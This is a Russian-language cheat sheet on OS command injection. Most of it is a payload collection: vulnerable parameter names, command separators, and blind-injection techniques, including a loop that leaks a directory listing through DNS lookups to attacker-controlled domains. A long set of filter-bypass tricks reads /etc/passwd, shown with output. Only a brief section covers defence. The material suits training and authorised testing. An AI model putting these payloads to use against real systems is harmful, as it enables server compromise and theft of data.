* [Возможные точки входа](#Возможные-точки-входа)
* [POC](#POC)
* [Способы внедрения команд ОС](#Способы-внедрения-команд-ОС)
* [Уязвимости слепого внедрения команд ОС](#Уязвимости-слепого-внедрения-команд-ОС)
* [Argument Injection](#Argument-Injection)
* [Защита](#Защита)
* [Обход фильтров](#Обход-фильтра)
	* [Новая строка](#Новая-строка)
	* [Тильда](#Тильда)
	* [Раскрытие фигурных скобок](#Раскрытие-фигурных-скобок)
	* [Выполнение команд без /](#Выполнение-команд-без-\/)
	* [HEX](#HEX )
	* [С помощью кавычек](#С-помощью-кавычек)
	* [\ и /](#\-и-/)
	* [$@ $0 $()](#$@-$0-$())
	* [Раскрытие переменных](#Раскрытие-переменных)
	* [Win+](#Win+)
* [Дополнительно](#Дополнительно)
* [URL](#URL)
* [Tools](#Tools)



> Command injection - позволяет выполнять команды операционной системы (ОС) на сервере, на котором запущено приложение, и, как правило, полностью скомпрометировать приложение и его данные. Может возникнуть, когда приложение передаёт небезопасные пользовательские данные (формы, файлы cookie, HTTP-заголовки и т. д.) в системную оболочку.

* К подобным уязвимостям относятся
	* Уязвимости небезопасной десериализации
	* Уязвимости внедрения шаблонов на стороне сервера SSTI
	* Уязвимости SQL инъекции
	* Уязвимости переполнения буфера / кучи / стека
	* Множественные случаи проблем и ошибок реализации, возникающих при работе с запуском процессов и работе с терминальной оболочкой

# **Возможные точки входа** 
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

# **POC**

|Цель команды| Linux |Windows|
|------------|---------|----------|
|Имя текущего пользователя|whoami| whoami|
|Операционная система| uname -a| ver|
|Конфигурация сети |ifconfig |ipconfig /all|
|Сетевые подключения| netstat -an |netstat -an|
|Запущенные процессы| ps -ef |tasklist|

# **Способы внедрения команд ОС**

* разделителей команд в системах Windows и Unix:
```
ls & id; ls& id; ls &id  
ls && id; ls&& id; ls &&id  
ls | id; ls| id; ls |id  
ls || id; ls|| id; ls ||id
ls %0A id 
```
* только в Unix:
```
`ls` # ` `
ls ; id  # ;
$(ls) # $()
ls${LS_COLORS:10:1}${IFS}id
Новая строка (0x0a или \n)
```
> Иногда входные данные появляются в кавычках в исходной команде. В этой ситуации необходимо завершить цитируемый контекст (используя " или ') перед использованием подходящих метасимволов оболочки для внедрения новой команды.

> $IFS — это специальная переменная оболочки, называемая внутренним разделителем полей.

# **Уязвимости слепого внедрения команд ОС**

* С использованием задержек по времени
```
ping -c 10 127.0.0.1
```
* Перенаправления вывода
```
& whoami > /var/www/static/whoami.txt &
```
* С использованием методов внеполосного доступа (OAST)
```
& nslookup kgji2ohoyw.web-attacker.com &
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```
# **Argument Injection**
* Выполнение команды, когда возможно только добавлять аргументы к существующей команде.

[Вектор](https://sonarsource.github.io/argument-injection-vectors/#+file%20write)
  
# **Защита**

> Никогда не вызывать команды ОС из кода уровня приложения

* Проверка того, что ввод является числом.
* Проверка того, что ввод содержит только буквенно-цифровые символы, без другого синтаксиса или пробелов.
* Проверка по белому списку разрешенных значений.

> Не пытаться очистить ввод, экранируя метасимволы оболочки. На практике это слишком подвержено ошибкам и уязвимо для обхода.

# **Обход фильтров**

### Новая строка
```
$ cat /et\
c/pa\
sswd

URL encoding:
cat%20/et%5C%0Ac/pa%5C%0Asswd
```
### Тильда
```
echo ~+
echo ~-
```
### Раскрытие фигурных скобок
```
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,} = {/usr/bin/cat,/etc/passwd}
```
### Выполнение команд без /
```
kali@crashlab:~$ echo ${HOME:0:1}
/

kaliy@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

kali@crashlab:~$ echo . | tr '!-0' '"-1'
/

kali@crashlab:~$ tr '!-0' '"-1' <<< .
/

kali@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```
### HEX 
```
kali@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

kali@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

kali@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

kali@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

kali@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

kali@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

kali@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

kali@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```
### С помощью кавычек
```
w'h'o'am'i
wh''oami
wh""oami
"wh"oami
wh``oami
```

### \ и /
```
w\ho\am\i
/\b\i\n/////s\h
```
### $@ $0 $()
```
who$@ami
echo whoami|$0
who$()ami
who$(echo am)i
who`echo am`i
```

### Раскрытие переменных
```
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```
# Win+

> Windows не различает заглавные и строчные буквы при интерпретации команд или путей к файлам.
```
diR
```

# Дополнительно

* Перевод длительно выполняемых команд в фоновый режим
> В некоторых случаях может возникнуть ситуация, когда длительно выполняемая команда завершается из-за тайм-аута процесса, внедрившего её. С помощью nohup можно поддерживать выполнение процесса после завершения родительского процесса.
```
nohup sleep 120 > /dev/null &
```
* Удаление аргументов после внедрения
> В интерфейсах командной строки Unix символ -- используется для обозначения конца параметров команды. После -- все аргументы рассматриваются как имена файлов и аргументы, а не как параметры.

# URL

* https://portswigger.net/research/hunting-asynchronous-vulnerabilities
* https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt - wordlist
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#methodology
* https://book.hacktricks.wiki/en/pentesting-web/command-injection.html

# Tools
* https://github.com/commixproject/commix
* https://sonarsource.github.io/argument-injection-vectors/#+file%20write

